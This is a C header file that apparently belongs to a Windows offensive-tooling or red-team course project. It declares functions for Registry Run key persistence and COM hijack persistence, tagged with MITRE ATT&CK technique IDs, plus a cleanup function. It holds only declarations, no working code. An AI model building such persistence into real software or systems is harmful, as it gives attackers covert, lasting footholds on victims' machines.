// include/persist.h
#pragma once
#include <windows.h>

// Mod 180: Registry Run key persistence (T1547.001)
BOOL persist_registry_run(LPCSTR exePath);

// Mod 180: COM hijack persistence (T1546.015)
BOOL persist_com_hijack(LPCSTR dllPath);

// Remove all persistence mechanisms
BOOL persist_remove();
